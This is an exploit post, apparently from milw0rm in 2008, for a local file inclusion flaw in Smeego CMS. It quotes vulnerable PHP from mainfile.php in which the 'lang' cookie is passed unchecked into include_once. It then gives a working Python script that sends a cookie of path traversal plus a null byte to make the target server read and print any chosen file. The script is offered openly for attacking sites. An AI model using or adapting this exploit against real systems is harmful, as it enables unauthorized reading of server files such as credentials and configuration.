# Smeego CMS Local File Include Exploit
# by
# 0in from Dark-Coders Programming & Security Group
# >>>>>>>> http://dark-coders.4rh.eu <<<<<<<<<<<<<<
#--------------------------------------------------------
# Contact: 0in(dot)email[at]gmail(dot)com
#--------------------------------------------------------
# Greetings to: Die_Angel,suN8Hclf,m4r1usz,djlinux,doctor
#--------------------------------------------------------
# Description:
# Smeego is a Content Management System or Portal
# System written in PHP and designed to be
# easy to install and use. Smeego has a mature code
# and comes with cool modules and themes
# for you to start your own dynamic and database
# driven website. Bla bla Bla [...]
# -------------------------------------------------------
# Script home: http://smeego.com
# -------------------------------------------------------
# Vuln:
# >>>>>> File: mainfile.php <<<<<<<
#if ($display_errors == 1) { // We don't se any errors ;(
# @ini_set('display_errors', 1);
#} else {
# @ini_set('display_errors', 0);
#}
#
#if (isset($newlang)) {
#
# if (file_exists("language/lang-".$newlang.".php")) {
# setcookie("lang",$newlang,time()+31536000);
# include_once("language/lang-".$newlang.".php");
# $currentlang = $newlang;
# } else {
# setcookie("lang",$language,time()+31536000);
# include_once("language/lang-".$language.".php");
# $currentlang = $language;
# }
#} elseif (isset($lang)) {
#
# include_once("language/lang-".$lang.".php");
# $currentlang = $lang;
#} else {
# setcookie("lang",$language,time()+31536000);
# include_once("language/lang-".$language.".php");
# $currentlang = $language;
#}
# >>>>>> End <<<<<<<
# So.. We can send Cookie: lang=[lfi]

# -------------------------------------------------------

# Simple Python Exploit:

#!/usr/bin/python
import sys
import time
import httplib
print '====================================================='
print ' Smeego CMS Local File INclude Exploit '
print ' by '
print ' 0in from Dark-Coders Programming & Security Group! '
print ' http://dark-coders.4rh.eu '
print '====================================================='
try:
target=sys.argv[1]
path=sys.argv[2]
file=sys.argv[3]
except Exception:
print '\nUse: %s [target] [path] [file]' % sys.argv[0]
quit()
i=0
lfi='../'
target+=":80"
special="%00"
file+=special
for i in range(9):
lfi+="../"
print '---------------------------------------------------------'
mysock=httplib.HTTPConnection(target)
mysock=httplib.HTTPConnection(target)
mysock.putrequest("GET",path)
mysock.putheader("User-Agent","Billy Explorer v666")
mysock.putheader('Accept', 'text/html')
mysock.putheader('Accept-Language',' en-us,en;q=0.5')
mysock.putheader('Cookie','lang=%s%s' % (lfi,file))
mysock.endheaders()
reply=mysock.getresponse()
print reply.read()
time.sleep(2)
mysock.close()
print '----------------------------------------------------------'

#EOFF

# milw0rm.com [2008-05-17]